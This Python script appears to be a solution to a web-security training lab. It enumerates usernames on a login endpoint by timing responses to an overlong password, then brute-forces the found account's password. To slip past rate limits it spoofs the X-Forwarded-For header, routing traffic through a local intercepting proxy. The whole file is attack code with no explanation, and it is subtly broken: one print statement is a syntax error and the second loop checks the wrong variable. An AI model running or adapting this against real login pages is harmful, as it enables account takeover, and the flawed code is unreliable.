import requests;import sys; import urllib ; import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': "http://127.0.0.1:8080", 'https': "https://127.0.0.1:8080"}
cookies = {'session': "v8XnLdT9mPM0M9e6TzKDhcACyA5gp1t7"}

def main():
    if len(sys.argv) < 2:
        print("(+) usage: python3 script.py <host>")
        return
    host = sys.argv[1]
    my_username = "wiener"
    my_password = "peter"
    payload = "skjhslkdjflksjdflksjdlfkjsldkfjlskdjflksdjflksjdlfkjsldkfjslkdjflskdjflksjdflkjsdlkfjlsdjflskjdflksjdflkjsldkfjlskdjflksdjflsjdlfkjsldfjldkfjslkdjflskjfalkjdflksjdlfkjsldkfjslkdjflskdjflksjdlkfjslkdjflskdjflskjdflksjdlkfjslkdjflskjdflsjflkjsdlfjsldkjflskdjflksjdlfjsllsdfjlskdjflksdjsdflskjdflksjdlfkjsldfjlskdjflksjdlfkjsldkjfslkdjflskjdflksjldfkjslkdjflskjdlfjsldkfjlskdjflksjdlfkjsldkjflsdjflksjdfl"
    usernames_file = open("usernames", 'r')
    usernames = usernames_file.read().split('\n')
    usernames_file.close()

    passwords_file = open("passwords", 'r')
    passwords = passwords_file.read().split('\n')
    passwords_file.close()
    target_username = ""
    index = 0
    count = 12430
    for index in range(0, len(usernames)):
        if index % 3 == 0:
            count+=1
        creds = {'username': usernames[index], 'password': payload}
        headers = {'X-Forwarded-For': str(count)}
        result = requests.post(host, cookies=cookies, data=creds, proxies=proxies, verify=False, headers=headers)
        if result.elapsed.total_seconds() > 1:
            target_username = usernames[index]
            print("target user is %s", %(target_username))
    
    for i in range(0, len(passwords)):
        if index % 3 == 0:
            count+=1
        creds = {'username': target_username, 'password': passwords[i]}
        headers = {'X-Forwarded-For': str(count)}
        result = requests.post(host, cookies=cookies, data=creds, proxies=proxies, verify=False, headers=headers)

        if result.status_code != 200:
            print("password of %s is %s" %(target_username, passwords[i]))
    




if __name__ == "__main__":
    main()
